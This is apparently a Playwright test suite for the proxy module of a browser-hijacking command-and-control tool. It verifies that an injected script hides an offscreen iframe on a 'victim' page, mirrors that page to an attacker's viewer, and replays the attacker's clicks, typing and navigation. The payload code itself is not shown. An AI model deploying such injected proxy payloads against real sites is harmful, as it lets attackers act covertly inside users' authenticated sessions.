/**
 * Proxy payload E2E tests.
 *
 * Verifies the bidirectional DOM streaming and input forwarding between the
 * victim page (proxy hidden iframe) and the attacker's viewer (ProxyPanel).
 *
 * Architecture:
 *   victimPage  → loads /test (the single injection point), injects proxy payload
 *   viewerPage  → navigates to /client/:id, opens Proxy tab
 *   Proxy iframe inside viewerPage is sandboxed (allow-same-origin only) so
 *   Playwright can interact with its elements directly — the ProxyPanel's
 *   event listeners on contentDocument will fire.
 *
 * Navigation pattern:
 *   All tests inject from /test (the only page with the inject UI), simulating
 *   a realistic client where the payload is loaded once.  Tests that need
 *   specific pages (contact form, blog) navigate the proxy iframe via nav links
 *   in the viewer — exactly how an attacker would operate.
 */
import { test, expect } from "@playwright/test";
import {
  loadServerUrls,
  createLink,
  injectAndWaitForClient,
  openClientTab,
  waitForViewerContent,
} from "./helpers.js";

let MGMT_URL, C2_URL;

test.beforeAll(() => {
  ({ MGMT_URL, C2_URL } = loadServerUrls());
});

test("proxy renders victim page in viewer", async ({ browser }) => {
  const victimCtx = await browser.newContext();
  const viewerCtx = await browser.newContext();
  const victimPage = await victimCtx.newPage();
  const viewerPage = await viewerCtx.newPage();

  const { scriptTag, linkId } = await createLink(MGMT_URL, C2_URL, ["proxy"], `${MGMT_URL}/test`);

  // All tests inject from /test — the single injection point
  await victimPage.goto(`${MGMT_URL}/test`);
  const clientId = await injectAndWaitForClient(victimPage, MGMT_URL, scriptTag, linkId);

  await openClientTab(viewerPage, MGMT_URL, clientId, "proxy");

  // Wait for the home page to load in the proxy viewer
  const frame = await waitForViewerContent(viewerPage);

  // Navigate the proxy to /test/contact via the nav link in the viewer
  await frame.locator("nav a[href='/test/contact']").click();

  // The contact form should now be visible in the proxy viewer
  await expect(frame.locator("form")).toBeVisible({ timeout: 10_000 });
  await expect(frame.locator("#name")).toBeVisible();

  await victimCtx.close();
  await viewerCtx.close();
});

test("clicking a button in viewer triggers it on proxied page", async ({ browser }) => {
  const victimCtx = await browser.newContext();
  const viewerCtx = await browser.newContext();
  const victimPage = await victimCtx.newPage();
  const viewerPage = await viewerCtx.newPage();

  const { scriptTag, linkId } = await createLink(MGMT_URL, C2_URL, ["proxy"], `${MGMT_URL}/test`);

  await victimPage.goto(`${MGMT_URL}/test`);
  const clientId = await injectAndWaitForClient(victimPage, MGMT_URL, scriptTag, linkId);

  await openClientTab(viewerPage, MGMT_URL, clientId, "proxy");
  const frame = await waitForViewerContent(viewerPage);

  // Click #btn-add inside the proxy viewer — the click is dispatched on the
  // proxy's hidden iframe, not the victim's visible page.
  await frame.locator("#btn-add").click();

  // The mutation is captured by MutationObserver and streamed back as a delta.
  // The viewer should reflect it without a full re-render.
  await expect(frame.locator("#sandbox")).toContainText("Added element #1", { timeout: 10_000 });

  await victimCtx.close();
  await viewerCtx.close();
});

test("typing in viewer input appears on victim", async ({ browser }) => {
  const victimCtx = await browser.newContext();
  const viewerCtx = await browser.newContext();
  const victimPage = await victimCtx.newPage();
  const viewerPage = await viewerCtx.newPage();

  const { scriptTag, linkId } = await createLink(MGMT_URL, C2_URL, ["proxy"], `${MGMT_URL}/test`);

  await victimPage.goto(`${MGMT_URL}/test`);
  const clientId = await injectAndWaitForClient(victimPage, MGMT_URL, scriptTag, linkId);

  await openClientTab(viewerPage, MGMT_URL, clientId, "proxy");
  const frame = await waitForViewerContent(viewerPage);

  // Navigate the proxy to the contact form
  await frame.locator("nav a[href='/test/contact']").click();
  await expect(frame.locator("#name")).toBeVisible({ timeout: 10_000 });

  // Click the name input in the proxy viewer to focus it
  await frame.locator("#name").click();
  // Type via the viewer page keyboard (events fire on iframeDoc which relays them)
  await viewerPage.keyboard.type("hello");

  // Wait for value-sync round-trip: the proxy iframe updates its input and
  // the viewer receives a value-sync message reflecting the new value.
  await expect(frame.locator("#name")).toHaveValue("hello", { timeout: 10_000 });

  await victimCtx.close();
  await viewerCtx.close();
});

test("link click in viewer navigates proxy", async ({ browser }) => {
  const victimCtx = await browser.newContext();
  const viewerCtx = await browser.newContext();
  const victimPage = await victimCtx.newPage();
  const viewerPage = await viewerCtx.newPage();

  const { scriptTag, linkId } = await createLink(MGMT_URL, C2_URL, ["proxy"], `${MGMT_URL}/test`);

  await victimPage.goto(`${MGMT_URL}/test`);
  const clientId = await injectAndWaitForClient(victimPage, MGMT_URL, scriptTag, linkId);

  await openClientTab(viewerPage, MGMT_URL, clientId, "proxy");
  const frame = await waitForViewerContent(viewerPage);

  // Click the "About" link inside the proxy viewer (scoped to nav to avoid strict-mode
  // violation — /test home page also has an About card link in the main content area)
  await frame.locator("nav a[href*='/test/about']").click();

  // The viewer URL bar should update to show the about page URL
  const urlBar = viewerPage.locator("input[placeholder*='Navigate']");
  await expect(urlBar).toHaveValue(/\/test\/about/, { timeout: 10_000 });

  // The viewer iframe should show the About page content
  await expect(frame.locator("h1")).toContainText("About", { timeout: 10_000 });

  await victimCtx.close();
  await viewerCtx.close();
});

test("multiple sequential link clicks work without iframe navigating to real URL", async ({ browser }) => {
  const victimCtx = await browser.newContext();
  const viewerCtx = await browser.newContext();
  const victimPage = await victimCtx.newPage();
  const viewerPage = await viewerCtx.newPage();

  const { scriptTag, linkId } = await createLink(MGMT_URL, C2_URL, ["proxy"], `${MGMT_URL}/test`);

  await victimPage.goto(`${MGMT_URL}/test`);
  const clientId = await injectAndWaitForClient(victimPage, MGMT_URL, scriptTag, linkId);

  await openClientTab(viewerPage, MGMT_URL, clientId, "proxy");
  const frame = await waitForViewerContent(viewerPage);

  // --- First navigation: Home → About ---
  await frame.locator("nav a[href*='/test/about']").click();
  await expect(frame.locator("h1")).toContainText("About", { timeout: 10_000 });

  // --- Second navigation: About → Products ---
  // This is the regression trigger: if doc.write() stripped listeners,
  // this click would cause the iframe to navigate to the real URL.
  await frame.locator("nav a[href*='/test/products']").click();
  await expect(frame.locator("h1")).toContainText("Products", { timeout: 10_000 });

  // The iframe must still be about:blank (never navigated to real URLs)
  const iframeSrc = await viewerPage.evaluate(() => {
    const iframe = document.querySelector('iframe[sandbox="allow-same-origin"]');
    return iframe?.getAttribute("src") ?? iframe?.src;
  });
  expect(iframeSrc).toMatch(/about:blank|^$/);

  await victimCtx.close();
  await viewerCtx.close();
});

test("scroll position syncs from victim to viewer", async ({ browser }) => {
  // Use a short viewport so the proxy's hidden iframe can scroll even on short pages.
  const victimCtx = await browser.newContext({ viewport: { width: 1280, height: 300 } });
  const viewerCtx = await browser.newContext({ viewport: { width: 1280, height: 600 } });
  const victimPage = await victimCtx.newPage();
  const viewerPage = await viewerCtx.newPage();

  const { scriptTag, linkId } = await createLink(MGMT_URL, C2_URL, ["proxy"], `${MGMT_URL}/test`);

  await victimPage.goto(`${MGMT_URL}/test`);
  const clientId = await injectAndWaitForClient(victimPage, MGMT_URL, scriptTag, linkId);

  await openClientTab(viewerPage, MGMT_URL, clientId, "proxy");
  const frame = await waitForViewerContent(viewerPage);

  // Navigate the proxy to the blog page which has more scrollable content
  await frame.locator("nav a[href='/test/blog']").click();
  await expect(frame.locator("h1")).toContainText("Blog", { timeout: 10_000 });

  // Scroll the proxy's hidden offscreen iframe on the victim's side.
  // The proxy attaches scroll listeners to proxyIframe.contentWindow,
  // so we must scroll that window — not the victim's main window.
  await victimPage.evaluate(() => {
    const proxyFrame = Array.from(document.querySelectorAll("iframe"))
      .find((f) => f.style && f.style.left === "-200vw");
    if (proxyFrame && proxyFrame.contentWindow) {
      proxyFrame.contentWindow.scrollTo(0, 200);
    }
  });

  // Wait for the viewer iframe to scroll to match (via scroll-sync message)
  await expect(async () => {
    const scrollY = await viewerPage.evaluate(() => {
      const iframe = document.querySelector('iframe[sandbox="allow-same-origin"]');
      return iframe?.contentWindow?.scrollY ?? 0;
    });
    expect(scrollY).toBeGreaterThanOrEqual(150);
  }).toPass({ timeout: 10_000 });

  await victimCtx.close();
  await viewerCtx.close();
});
